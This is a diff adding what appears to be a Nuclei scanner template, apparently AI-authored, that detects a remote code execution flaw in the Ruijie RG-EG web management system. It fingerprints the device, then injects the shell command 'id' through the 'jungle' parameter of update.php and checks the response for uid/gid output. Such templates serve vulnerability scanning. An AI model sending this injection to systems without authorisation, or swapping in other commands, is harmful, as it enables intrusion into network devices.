@@ -1,0 +1,42 @@
+id: ruijie-rg-eg-web-mis-rce
+info:
+  name: Ruijie RG-EG Web Management System RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ruijie"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/update.php?jungle=id"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "uid=\\d+\\(\\w+\\)\\s+gid=\\d+\\(\\w+\\)"
+      - type: word
+        part: body
+        words:
+          - "text/html"
+        negative: true
+      - type: word
+        part: headers
+        words:
+          - "text/html"
